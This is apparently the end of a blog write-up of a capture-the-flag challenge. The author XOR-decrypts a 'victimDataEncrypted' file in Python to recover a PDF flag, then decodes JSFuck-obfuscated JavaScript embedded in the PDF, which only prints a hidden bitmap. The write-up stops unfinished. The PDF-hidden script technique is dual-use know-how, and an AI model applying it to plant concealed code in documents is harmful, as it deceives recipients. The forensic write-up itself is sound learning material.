<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>encrypted <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;victimDataEncrypted&#34;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;key&#34;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> encrypted:
</span></span><span style="display:flex;"><span>    decypted_byte <span style="color:#f92672">=</span> byte <span style="color:#f92672">^</span> key[key_index]
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">.</span>write(bytes([decypted_byte]))
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>    key_index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    key_index <span style="color:#f92672">=</span> key_index <span style="color:#f92672">%</span> len(key)
</span></span></code></pre></div><p>Which gave me a file that the <code>file</code> command says <code>data: POSIX tar archive (GNU)</code>.
Using <code>tar -xf data -C extracted/</code> I find a pdf called <code>topphemligt.pdf</code>. Exciting!!!
The pdf contains the flag:
<img src="/FRA_Kattastrofen/flag2.png" alt="Flag 2 in a picture of a kitten"></p>
<h1 id="flag-3">Flag 3<a href="#flag-3" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>¯_(ツ)_/¯</p>
<p>I am working on it. I found a reference to javascript in the strings found in the pdf file and a long hexstring. I decoded the hexstring and found:</p>
<pre tabindex="0"><code>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+.........
</code></pre><p>I had no clue what this was and if it was normal for a pdf.</p>
<p>I asked chatgpt what it was and it told me about <code>JSFUCK</code>. This is a technique used to obsfucate javascript code.</p>
<p>I am on the right track for sure!</p>
<p>Using an online decoder I found:</p>
<pre tabindex="0"><code class="language-javscript" data-lang="javscript">const data = [0n, 16777216n, 963362762567186450219276n, 1227815285621149424943362n, 4251180420234710034485506n, 1227908978741191150735617n, 1228942000327703451209986n, 1229089574843243084713986n, 1229089574913611821027586n, 1276163323341699551654156n, 1170935903267323904n, 16393102643729268736n];
if(0.1 + 0.2 == 0.3){
  let str = &#34;&#34;;   
  for(let x of data){ 
    str += x.toString(2).padStart(106, &#39;0&#39;) + &#34;\n&#34;;
  }   
  app.alert(str.replaceAll(&#34;0&#34;, &#34; &#34;).replaceAll(&#34;1&#34;, &#34;)); 
}
</code></pre><p>I have not gotten further than this at the time of writing.</p>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h"></span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
    
    
      <a href="http://localhost:1313/posts/challanges_flags/fra_dungeon/" class="button inline next">
         [<span class="button__text">FRA Dungeon</span>] &gt;
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
